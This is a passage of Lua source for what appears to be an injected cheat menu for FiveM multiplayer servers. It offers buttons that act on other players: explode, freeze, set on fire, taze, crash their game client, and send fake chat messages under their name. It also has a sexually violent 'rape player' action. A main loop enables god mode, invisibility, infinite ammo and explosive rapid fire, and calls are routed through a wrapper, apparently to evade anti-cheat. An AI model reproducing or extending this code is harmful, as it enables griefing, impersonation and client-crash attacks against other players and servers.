                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELDOWN"]) then
                           scroller_pos = scroller_pos + 8
                           scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
                       elseif ADRVSDD:GetFunction("IsDisabledControlPressed")(0, self.Keys["MWHEELUP"]) then
                           scroller_pos = scroller_pos - 8
                           scroller_pos = self:Clamp(scroller_pos, 0, self.MenuH - 120 - scroller_size)
                       end
                   end
       
                   if self.Painter:Holding(self.Config.MenuX + 5 + 100 + 5 + 415 + 265 + 113, self.Config.MenuY + 108 + scroller_pos, 8, scroller_size, "scroll_bar") then
                       ADRVSDD:GetFunction("SetMouseCursorSprite")(4)
                       local y = ADRVSDD:TranslateScroller(self.Config.MenuY + 68, scroller_size, scroller_pos)
                       scrolling = true
                       scroller_pos = self:Clamp(y, 0, self.MenuH - 120 - scroller_size)
                   else
                       scroller_y = nil
                       scrolling = false
                   end
               else
                   self.Painter:DrawText("Selected: " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.SelectedPlayer)) .. " (ID: " .. ADRVSDD:GetFunction("GetPlayerServerId")(self.SelectedPlayer) .. ")", 4, false, self.Config.MenuX + 530 + 113, self.Config.MenuY + 67, 0.35, 255, 255, 255, 255)
                   local curY = 3
       
                   if self.Painter:Button("BACK", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "go_back", false, 0.35) then
                       self.SelectedPlayer = nil
                       halt = true
                   end
       
                   if not halt then
                       curY = curY + 20
                       local spectate_text = ""
       
                       if self.SpectatingPlayer and ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                           spectate_text = " [SPECTATING: " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.SpectatingPlayer)) .. "]"
                       end
       
                       local track_text = ""
       
                       if self.TrackingPlayer and ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
                           track_text = " [TRACKING: " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.TrackingPlayer)) .. "]"
                       end
       
                       if self.SelectedPlayer ~= ADRVSDD:GetFunction("PlayerId")() then
                           if self.Painter:Button("TELEPORT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "teleport_player", false, 0.35) then
                               local ped = ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer)
                               local coords = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ped, 0.0, 0.0, 0.0)
                               ADRVSDD:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)
       
                               if ADRVSDD:GetFunction("IsPedInAnyVehicle")(ped) and ADRVSDD:GetFunction("AreAnyVehicleSeatsFree")(ADRVSDD:GetFunction("GetVehiclePedIsIn")(ped)) then
                                   ADRVSDD:GetFunction("SetPedIntoVehicle")(ADRVSDD:GetFunction("PlayerPedId")(), ADRVSDD:GetFunction("GetVehiclePedIsIn")(ped), -2)
                               else
                                   ADRVSDD:GetFunction("SetEntityCoords")(ADRVSDD:GetFunction("PlayerPedId")(), coords.x, coords.y, coords.z)
                               end
       
                               ADRVSDD:AddNotification("SUCCESS", "Teleported to player.")
                           end
       
                           curY = curY + 20
                       end
       
                       if self.SelectedPlayer ~= ADRVSDD:GetFunction("PlayerId")() then
                           if self.Painter:Button("TRACK" .. track_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "track_player", false, 0.35) then
                               if self.TrackingPlayer ~= nil and ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.TrackingPlayer)) then
                                   ADRVSDD:AddNotification("INFO", "Stopped tracking " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.TrackingPlayer)))
                                   self.TrackingPlayer = nil
                               else
                                   self.TrackingPlayer = self.SelectedPlayer
                                   ADRVSDD:AddNotification("INFO", "Tracking " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.TrackingPlayer)), 10000)
                               end
                           end
       
                           curY = curY + 20
                       end
       
                       if self.SelectedPlayer ~= ADRVSDD:GetFunction("PlayerId")() then
                           if self.Painter:Button("SPECTATE" .. spectate_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "spectate_player", false, 0.35) then
                               if self.SpectatingPlayer ~= nil and ADRVSDD:GetFunction("DoesEntityExist")(ADRVSDD:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then
                                   ADRVSDD:AddNotification("INFO", "Stopped spectating " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.SpectatingPlayer)))
                                   ADRVSDD:Spectate(false)
                               else
                                   ADRVSDD:Spectate(self.SelectedPlayer)
                                   ADRVSDD:AddNotification("INFO", "Spectating " .. ADRVSDD:CleanName(ADRVSDD:GetFunction("GetPlayerName")(self.SpectatingPlayer)), 10000)
                               end
                           end
       
                           curY = curY + 20
                       end
       
                       if self.Painter:Button("EXPLODE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "explode_player", false, 0.35) then
                           ADRVSDD:GetFunction("AddExplosion")(ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer), 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                           ADRVSDD:AddNotification("INFO", "Player blown up.", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button(frozen_players[self.SelectedPlayer] and "UNFREEZE" or "FREEZE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "freeze_player", false, 0.35) then
                           frozen_players[self.SelectedPlayer] = not frozen_players[self.SelectedPlayer]
                           ADRVSDD:AddNotification("INFO", "Player " .. (frozen_players[self.SelectedPlayer] and "frozen" or "unfrozen") .. ".", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("GIVE ALL WEAPONS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "give_player_all_weapons", false, 0.35) then
                           local ped = ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer)
       
                           for _, wep in dict.pairs(all_weapons) do
                               ADRVSDD:GetFunction("GiveWeaponToPed")(ped, ADRVSDD:GetFunction("GetHashKey")(wep), 9000, false, true)
                           end
       
                           ADRVSDD:AddNotification("SUCCESS", "All weapons given.", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("REMOVE ALL WEAPONS", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "remove_player_all_weapons", false, 0.35) then
                           local ped = ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer)
       
                           for _, wep in dict.pairs(all_weapons) do
                               ADRVSDD:GetFunction("RemoveWeaponFromPed")(ped, ADRVSDD:GetFunction("GetHashKey")(wep), 9000, false, true)
                           end
       
                           ADRVSDD:AddNotification("SUCCESS", "Weapons removed.", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("GAS PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "gas_player", false, 0.35) then
                           ADRVSDD:GasPlayer(self.SelectedPlayer)
       
                           if not ADRVSDD.Config.SafeMode then
                               ADRVSDD:AddNotification("SUCCESS", "Player gassed!", 10000)
                           end
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("TAZE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "taze_player", false, 0.35) then
                           ADRVSDD:TazePlayer(self.SelectedPlayer)
                           ADRVSDD:AddNotification("SUCCESS", "Player tazed!", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("HYDRANT PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "hydrant_player", false, 0.35) then
                           ADRVSDD:HydrantPlayer(self.SelectedPlayer)
                           ADRVSDD:AddNotification("SUCCESS", "Player sprayed!", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("FIRE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fire_player", false, 0.35) then
                           ADRVSDD:FirePlayer(self.SelectedPlayer)
                           ADRVSDD:AddNotification("SUCCESS", "Player set on fire!", 10000)
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("KICK FROM VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "kick_player_car", false, 0.35) then
                           if not ADRVSDD:GetFunction("IsPedInAnyVehicle")(ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
                               ADRVSDD:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
                           else
                               ADRVSDD:GetFunction("ClearPedTasksImmediately")(ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer))
                               ADRVSDD:AddNotification("SUCCESS", "Player kicked from vehicle!", 5000)
                           end
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("DISABLE VEHICLE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "disable_player_car", false, 0.35) then
                           if not ADRVSDD:GetFunction("IsPedInAnyVehicle")(ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer)) then
                               ADRVSDD:AddNotification("ERROR", "Player is not in a vehicle!", 5000)
                           else
                               ADRVSDD:AddNotification("SUCCESS", "Disabling vehicle.", 5000)
                               ADRVSDD:DisableVehicle(ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("GetPlayerPed")(self.SelectedPlayer)))
                           end
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("RAPE PLAYER", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "rape_player", false, 0.35) then
                           ADRVSDD:RapePlayer(self.SelectedPlayer)
       
                           if not ADRVSDD.Config.SafeMode then
                               ADRVSDD:AddNotification("SUCCESS", "Player raped!", 10000)
                           end
                       end
       
                       curY = curY + 20
                       local friend_text = friends[ADRVSDD:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] and "REMOVE FRIEND" or "MARK AS FRIEND"
       
                       if self.Painter:Button(friend_text, self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "friend_toggle", false, 0.35) then
                           friends[ADRVSDD:GetFunction("GetPlayerServerId")(self.SelectedPlayer)] = not friends[ADRVSDD:GetFunction("GetPlayerServerId")(self.SelectedPlayer)]
                       end
       
                       curY = curY + 20
       
                       if self.Painter:Button("STEAL OUTFIT", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "steal_player_outfit", false, 0.35) then
                           ADRVSDD:StealOutfit(self.SelectedPlayer)
                           ADRVSDD:AddNotification("SUCCESS", "Outfit stolen.", 5000)
                       end
       
                       curY = curY + 20
       
                       if self.DynamicTriggersasdf["chat"] and self.DynamicTriggersasdf["chat"]["_chat:messageEntered"] then
                           if self.Painter:Button("FAKE CHAT MESSAGE", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "fake_chat_message", false, 0.35) then
                               local ADRVSDDM = ADRVSDD:GetTextInput("Enter message to send.", "", 100)
                               local playa = ADRVSDD:GetFunction("GetPlayerName")(self.SelectedPlayer)
       
                               if ADRVSDDM then
                                   ADRVSDD:GetFunction("TriggerServerEvent")(self.DynamicTriggersasdf["chat"]["_chat:messageEntered"], playa, {0, 0x99, 255}, ADRVSDDM)
                                   ADRVSDD:AddNotification("SUCCESS", "Message sent!", 10000)
                               end
                           end
       
                           curY = curY + 20
                       end
       
                       if self.Painter:Button("~r~CRASH PLAYER (SHIFT FOR METHOD)", self.Config.MenuX + 525 + 113, self.Config.MenuY + 101, 5, curY, nil, 20, 255, 255, 255, 255, "crash_online_player", false, 0.35) then
                           local method = nil
       
                           if ADRVSDD.Config.SafeMode then
                               ADRVSDD:AddNotification("WARN", "Safe mode is currently on, if you wish to use this, disable it.")
                           else
                               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                                   local _method = ADRVSDD:GetTextInput("Enter crash method. [object / ped / both]", "both", 10)
       
                                   if _method then
                                       method = _method
                                       ADRVSDD:AddNotification("INFO", "Using " .. method .. " crash method.")
                                   end
                               end
       
                               ADRVSDD:CrashPlayer(self.SelectedPlayer, nil, method)
                           end
                       end
                   end
               end
       
               local curX = self.Config.MenuX + 7
       
               for _, data in dict.pairs(self.Categories) do
                   local size = self.Painter:GetTextWidth(data.Title, 4, 0.34)
       
                   if self.Painter:ListItem(data.Title, curX, self.Config.MenuY + 26, 0, 0, size + 29.6, 20, 0, 0, 0, 200, "category_" .. _) then
                       self.Config.CurrentSelection = _
                       self.Config.SelectedCategory = "category_" .. _
                   end
       
                   curX = curX + size + 29.6 + 2
               end
       
               if self.Config.CurrentSelection then
                   self.Categories[self.Config.CurrentSelection].Build(ADRVSDD, self.Config.MenuX + 5, self.Config.MenuY + 46, 515 + 113, self.MenuH - 28)
               end
           end
       
           local last_clean = 0
       
           function ADRVSDD:Cleanup()
               if last_clean <= ADRVSDD:GetFunction("GetGameTimer")() then
                   last_clean = ADRVSDD:GetFunction("GetGameTimer")() + 15000
                   collectgarbage("collect")
               end
           end
       
           local was_showing
           local was_invis
           local was_other_invis = {}
           local was_noragdoll
           local was_fastrun
           local walking
           local magic_carpet_obj
           local preview_magic_carpet
           local magic_riding
           local was_infinite_combat_roll
           local was_fakedead
           local fakedead_timer = 0
           local last_afk_move = 0
       
           CreateThread(function()
               while ADRVSDD.Enabled do
                   Wait(0)
       
                   if ADRVSDD.Config.Player.RevealInvisibles then
                       for id, src in dict.pairs(ADRVSDD.PlayerCache) do
                           src = dict.tonumber(src)
       
                           if src ~= PlayerId() then
                               local _ped = ADRVSDD:GetFunction("GetPlayerPed")(src)
                               local where = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_ped, 0.0, 0.0, 1.0)
                               local us = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0, 0.0, 0.0)
                               local dist = ADRVSDD:GetFunction("GetDistanceBetweenCoords")(where.x, where.y, where.z, us.x, us.y, us.z)
       
                               if dist <= 100.0 then
                                   local invis = not ADRVSDD:GetFunction("IsEntityVisibleToScript")(_ped)
       
                                   if invis then
                                       ADRVSDD:GetFunction("SetEntityLocallyVisible")(_ped, true)
                                       ADRVSDD:GetFunction("SetEntityAlpha")(_ped, 150)
                                       ADRVSDD:Draw3DText(where.x, where.y, where.z + 0.3, "*PLAYER INVISIBLE*", 255, 55, 55, 255)
                                       was_other_invis[src] = true
                                   else
                                       ADRVSDD:GetFunction("SetEntityAlpha")(_ped, 255)
                                       was_other_invis[src] = false
                                   end
                               else
                                   ADRVSDD:GetFunction("SetEntityAlpha")(_ped, 255)
                                   was_other_invis[src] = false
                               end
                           end
                       end
                   end
               end
           end)
       
           function ADRVSDD:DoCrosshair()
               if not ADRVSDD.Config.Player.CrossHair then return end
               ADRVSDD.Painter:DrawRect(ADRVSDD:ScrW() / 2 - 1, ADRVSDD:ScrH() / 2 - 7.5, 2, 15, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 255)
               ADRVSDD.Painter:DrawRect(ADRVSDD:ScrW() / 2 - 7.5, ADRVSDD:ScrH() / 2 - 1, 15, 2, ADRVSDD.Tertiary[1], ADRVSDD.Tertiary[2], ADRVSDD.Tertiary[3], 255)
           end
       
           local _was_anti_afk
           local sort_func = function(srcA, srcB) return srcA - srcB end
       
           CreateThread(function()
               while ADRVSDD.Enabled do
                   Wait(0)
                   ADRVSDD.PlayerCache = GetActivePlayers()
                   local w, h = ADRVSDD:GetFunction("GetActiveScreenResolution")()
                   local x, y = ADRVSDD:GetFunction("GetNuiCursorPosition")()
                   ADRVSDD._ScrW = w
                   ADRVSDD._ScrH = h
                   ADRVSDD._MouseX = x
                   ADRVSDD._MouseY = y
                   if w and h and not ADRVSDD.Config.NotifX and not ADRVSDD.Config.NotifY then
                       ADRVSDD.Config.NotifX = w - ADRVSDD.Config.NotifW - 20
                       ADRVSDD.Config.NotifY = 20
                   end
       
                   if not ADRVSDD.Config.NotifW then
                       ADRVSDD.Config.NotifW = 420
                   end
       
                   ADRVSDD:Cleanup()
                   ADRVSDD:DoESP()
                   ADRVSDD:DoAntiAim()
                   ADRVSDD:DoVehicleRelated()
                   ADRVSDD:DoBlips()
                   ADRVSDD:Tracker()
                   ADRVSDD:DoFrozen()
                   ADRVSDD:DoCrosshair()
                   local keyboard_open = ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 2
       
                   if not ADRVSDD:GetFunction("HasStreamedTextureDictLoaded")("commonmenu") then
                       ADRVSDD:GetFunction("RequestStreamedTextureDict")("commonmenu")
                   end
       
                   ADRVSDD:DrawNotifications()
       
                   if walking and not magic_riding then
                       local safe
       
                       if not ADRVSDD.Showing and ADRVSDD.Config.UseAutoWalk and not (ADRVSDD.Config.UseAutoWalkAlt and (ADRVSDD.FreeCam.On or ADRVSDD.RCCar.CamOn)) then
                           safe = true
                       elseif not ADRVSDD.Config.UseAutoWalk and not (ADRVSDD.Config.UseAutoWalkAlt and (ADRVSDD.FreeCam.On or ADRVSDD.RCCar.CamOn)) then
                           safe = true
                       elseif not ADRVSDD.Config.UseAutoWalkAlt and (ADRVSDD.FreeCam.On or ADRVSDD.RCCar.CamOn) then
                           safe = true
                       end
       
                       if not ADRVSDD.Config.Player.AntiAFK and _was_anti_afk then
                           safe = true
                       end
       
                       if ADRVSDD.Config.Player.AntiAFK then
                           safe = false
                       end
       
                       if safe then
                           ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                           walking = false
                       end
                   end
       
                   if not walking and not magic_riding then
                       local safe
       
                       if ADRVSDD.Showing and ADRVSDD.Config.UseAutoWalk and not (ADRVSDD.RCCar.CamOn or ADRVSDD.FreeCam.On) then
                           safe = true
                       elseif ADRVSDD.Config.UseAutoWalkAlt and (ADRVSDD.RCCar.CamOn or ADRVSDD.FreeCam.On) then
                           safe = true
                       end
       
                       if was_fakedead or fakedead_timer >= ADRVSDD:GetFunction("GetGameTimer")() then
                           safe = false
                           ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                       end
       
                       if ADRVSDD.Config.Player.AntiAFK then
                           safe = true
                       end
       
                       if safe then
                           walking = true
                           local veh = ADRVSDD:GetFunction("GetVehiclePedIsIn")(ADRVSDD:GetFunction("PlayerPedId")())
       
                           if ADRVSDD:GetFunction("DoesEntityExist")(veh) then
                               ADRVSDD:GetFunction("TaskVehicleDriveWander")(ADRVSDD:GetFunction("PlayerPedId")(), veh, 40.0, 0)
                           else
                               ADRVSDD:GetFunction("TaskWanderStandard")(ADRVSDD:GetFunction("PlayerPedId")(), 10.0, 10)
                           end
                       end
                   end
       
                   if ADRVSDD.Showing then
                       ADRVSDD:GetFunction("DisableAllControlActions")(0)
                       ADRVSDD:GetFunction("SetMouseCursorActiveThisFrame")()
                       ADRVSDD:GetFunction("SetMouseCursorSprite")(1)
                       ADRVSDD:DrawMenu()
       
                       if not was_showing then
                           selected_config = "none"
                       end
       
                       was_showing = true
                   elseif was_showing then
                       if walking and not ADRVSDD:GetFunction("IsEntityInAir")(ADRVSDD:GetFunction("PlayerPedId")()) then
                           ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                           walking = false
                       end
       
                       was_showing = false
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys[ADRVSDD.Config.ShowKey]) and not keyboard_open then
                       ADRVSDD.Showing = not ADRVSDD.Showing
                   end
       
                   if ADRVSDD.Config.FreeCamKey ~= "NONE" and ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys[ADRVSDD.Config.FreeCamKey]) and not keyboard_open then
                       ADRVSDD.FreeCam.On = not ADRVSDD.FreeCam.On
                   end
       
                   if ADRVSDD.Config.RCCamKey ~= "NONE" and ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys[ADRVSDD.Config.RCCamKey]) and not keyboard_open then
                       if ADRVSDD.RCCar.On then
                           ADRVSDD.RCCar.CamOn = not ADRVSDD.RCCar.CamOn
                       else
                           ADRVSDD:AddNotification("ERROR", "No RC Car is active!")
                       end
                   end
       
                   if ADRVSDD.Config.DisableKey ~= "NONE" and ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys[ADRVSDD.Config.DisableKey]) and not keyboard_open then
                       ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                       ADRVSDD.Enabled = false
                       ADRVSDD:Print("[MENU] Menu killed.")
                   end
       
                   if ADRVSDD.Config.Player.ForceRadar then
                       ADRVSDD:GetFunction("DisplayRadar")(true)
                   end
       
                   if ADRVSDD.Config.Player.FakeDead then
                       ADRVSDD:GetFunction("SetPedToRagdoll")(ADRVSDD:GetFunction("PlayerPedId")(), 1000, 1000, 0, true, true, false)
                       was_fakedead = true
                   elseif was_fakedead then
                       walking = false
                       ADRVSDD:GetFunction("SetPedToRagdoll")(ADRVSDD:GetFunction("PlayerPedId")(), 1, 1, 0, true, true, false)
                       ADRVSDD:GetFunction("ClearPedTasks")(ADRVSDD:GetFunction("PlayerPedId")())
                       was_fakedead = false
                       fakedead_timer = ADRVSDD:GetFunction("GetGameTimer")() + 1500
                   end
       
                   if ADRVSDD.Config.Player.SuperJump then
                       ADRVSDD:GetFunction("SetSuperJumpThisFrame")(PlayerId())
                   end
       
                   if ADRVSDD.Config.Player.Invisibility then
                       ADRVSDD:GetFunction("SetEntityVisible")(ADRVSDD:GetFunction("PlayerPedId")(), false, false)
                       ADRVSDD:GetFunction("SetEntityLocallyVisible")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                       ADRVSDD:GetFunction("SetEntityAlpha")(ADRVSDD:GetFunction("PlayerPedId")(), 150)
                       was_invis = true
                   elseif was_invis then
                       ADRVSDD:GetFunction("SetEntityVisible")(ADRVSDD:GetFunction("PlayerPedId")(), true, true)
                       ADRVSDD:GetFunction("SetEntityAlpha")(ADRVSDD:GetFunction("PlayerPedId")(), 255)
                       was_invis = false
                   end
       
                   ADRVSDD:GetFunction("SetEntityProofs")(ADRVSDD:GetFunction("PlayerPedId")(), ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God, ADRVSDD.Config.Player.God)
       
                   if ADRVSDD.Config.Player.SemiGod then
                       ADRVSDD:GetFunction("SetEntityHealth")(ADRVSDD:GetFunction("PlayerPedId")(), 200)
                   end
       
                   if ADRVSDD.Config.Player.InfiniteStamina then
                       ADRVSDD:GetFunction("ResetPlayerStamina")(ADRVSDD:GetFunction("PlayerId")())
                   end
       
                   if ADRVSDD.Config.Player.NoRagdoll then
                       ADRVSDD:GetFunction("SetPedCanRagdoll")(ADRVSDD:GetFunction("PlayerPedId")(), false)
                       was_noragdoll = true
                   elseif was_noragdoll then
                       ADRVSDD:GetFunction("SetPedCanRagdoll")(ADRVSDD:GetFunction("PlayerPedId")(), true)
                       was_noragdoll = false
                   end
       
                   if ADRVSDD.Config.Player.FastRun then
                       ADRVSDD:GetFunction("SetRunSprintMultiplierForPlayer")(ADRVSDD:GetFunction("PlayerId")(), 1.49)
                       ADRVSDD:GetFunction("SetPedMoveRateOverride")(ADRVSDD:GetFunction("PlayerPedId")(), 2.0)
                       was_fastrun = true
                   elseif was_fastrun then
                       ADRVSDD:GetFunction("SetRunSprintMultiplierForPlayer")(ADRVSDD:GetFunction("PlayerId")(), 1.0)
                       ADRVSDD:GetFunction("SetPedMoveRateOverride")(ADRVSDD:GetFunction("PlayerPedId")(), 0.0)
                       was_fastrun = false
                   end
       
                   if ADRVSDD.Config.Player.NoReload then
                       local curWep = ADRVSDD:GetFunction("GetSelectedPedWeapon")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       if curWep ~= ADRVSDD:GetFunction("GetHashKey")("WEAPON_MINIGUN") then
                           ADRVSDD:GetFunction("PedSkipNextReloading")(ADRVSDD:GetFunction("PlayerPedId")())
                       end
                   end
       
                   if ADRVSDD.Config.Player.InfiniteAmmo then
                       local curWep = ADRVSDD:GetFunction("GetSelectedPedWeapon")(ADRVSDD:GetFunction("PlayerPedId")())
                       local ret, cur_ammo = ADRVSDD:GetFunction("GetAmmoInClip")(ADRVSDD:GetFunction("PlayerPedId")(), curWep)
       
                       if ret then
                           local max_ammo = ADRVSDD:GetFunction("GetMaxAmmoInClip")(ADRVSDD:GetFunction("PlayerPedId")(), curWep, 1)
       
                           if cur_ammo < max_ammo and max_ammo > 0 then
                               ADRVSDD:GetFunction("SetAmmoInClip")(ADRVSDD:GetFunction("PlayerPedId")(), curWep, max_ammo)
                           end
                       end
       
                       local ret, max = ADRVSDD:GetFunction("GetMaxAmmo")(ADRVSDD:GetFunction("PlayerPedId")(), curWep)
       
                       if ret then
                           ADRVSDD:GetFunction("SetPedAmmo")(ADRVSDD:GetFunction("PlayerPedId")(), curWep, max)
                       end
                   end
       
                   if ADRVSDD.Config.Player.InfiniteAmmo then
                       local curWep = ADRVSDD:GetFunction("GetSelectedPedWeapon")(ADRVSDD:GetFunction("PlayerPedId")())
                       local ret, cur_ammo = ADRVSDD:GetFunction("GetAmmoInClip")(ADRVSDD:GetFunction("PlayerPedId")(), curWep)
       
                       if ret then
                           local max_ammo = ADRVSDD:GetFunction("GetMaxAmmoInClip")(ADRVSDD:GetFunction("PlayerPedId")(), curWep, 1)
       
                           if cur_ammo < max_ammo and max_ammo > 0 then
                               ADRVSDD:GetFunction("SetAmmoInClip")(ADRVSDD:GetFunction("PlayerPedId")(), curWep, max_ammo)
                           end
                       end
                   end
       
                   if ADRVSDD.Config.Player.RapidFire and IsDisabledControlPressed(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing and (not ADRVSDD.FreeCam.On and not ADRVSDD.RCCar.CamOn) then
                       local curWep = ADRVSDD:GetFunction("GetSelectedPedWeapon")(ADRVSDD:GetFunction("PlayerPedId")())
                       local cur = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ADRVSDD:GetFunction("GetCurrentPedWeaponEntityIndex")(ADRVSDD:GetFunction("PlayerPedId")()), 0.0, 0.0, 0.0)
                       local _dir = ADRVSDD:GetFunction("GetGameplayCamRot")(0)
                       local dir = rot_to_dir(_dir)
                       local dist = ADRVSDD.Config.Player.NoDrop and 99999.0 or 200.0
                       local len = _multiply(dir, dist)
                       local targ = cur + len
                       ADRVSDD:GetFunction("ShootSingleBulletBetweenCoords")(cur.x, cur.y, cur.z, targ.x, targ.y, targ.z, 5, 1, curWep, ADRVSDD:GetFunction("PlayerPedId")(), true, true, 24000.0)
       
                       if ADRVSDD.Config.Player.ExplosiveAmmo then
                           local impact, coords = ADRVSDD:GetFunction("GetPedLastWeaponImpactCoord")(ADRVSDD:GetFunction("PlayerPedId")())
       
                           if impact then
                               ADRVSDD:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
                           end
                       end
                   end
       
                   if not ADRVSDD.Config.Player.RapidFire and ADRVSDD.Config.Player.ExplosiveAmmo then
                       local impact, coords = ADRVSDD:GetFunction("GetPedLastWeaponImpactCoord")(ADRVSDD:GetFunction("PlayerPedId")())
       
                       if impact then
                           ADRVSDD:GetFunction("AddExplosion")(coords.x, coords.y, coords.z, 7, 100000.0, true, false, 0.0)
                       end
       
                       ADRVSDD:GetFunction("SetExplosiveMeleeThisFrame")(ADRVSDD:GetFunction("PlayerId")())
                   end
       
                   if ADRVSDD.Config.Player.InfiniteCombatRoll then
                       for i = 0, 3 do
                           ADRVSDD:GetFunction("StatSetInt")(ADRVSDD:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 9999, true)
                           ADRVSDD:GetFunction("StatSetInt")(ADRVSDD:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 9999, true)
                       end
       
                       was_infinite_combat_roll = true
                   elseif was_infinite_combat_roll then
                       for i = 0, 3 do
                           ADRVSDD:GetFunction("StatSetInt")(ADRVSDD:GetFunction("GetHashKey")("mp" .. i .. "_shooting_ability"), 0, true)
                           ADRVSDD:GetFunction("StatSetInt")(ADRVSDD:GetFunction("GetHashKey")("sp" .. i .. "_shooting_ability"), 0, true)
                       end
                   end
       
                   if ADRVSDD.Config.Player.MagMode then
                       ADRVSDD:DoMagneto()
                   end
       
                   ADRVSDD:DoKeyPressed()
               end
           end)
       
